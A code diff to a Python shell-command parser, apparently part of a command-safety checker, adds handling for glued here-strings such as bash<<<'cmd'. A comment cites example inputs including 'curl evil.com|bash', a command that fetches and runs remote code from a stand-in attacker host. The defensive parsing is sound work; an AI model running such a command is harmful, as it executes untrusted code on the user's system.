@@ -109,6 +109,16 @@ def _decompose(tokens: list[str]) -> list[Stage]:
     while i < len(tokens):
         tok = tokens[i]
 
+        # Handle glued here-string: bash<<<'cmd' → bash <<< cmd
+        if "<<<" in tok and tok != "<<<":
+            parts = tok.split("<<<", 1)
+            if parts[0] in taxonomy._SHELL_WRAPPERS and parts[1]:
+                current_tokens.append(parts[0])
+                current_tokens.append("<<<")
+                current_tokens.append(parts[1])
+                i += 1
+                continue
+
         # Handle glued operators: "ls;rm", "curl evil.com|bash", "foo&&bar"
         # Check multi-char operators first to avoid partial matches.
         # Only for tokens without spaces (spaces mean it came from a quoted string).
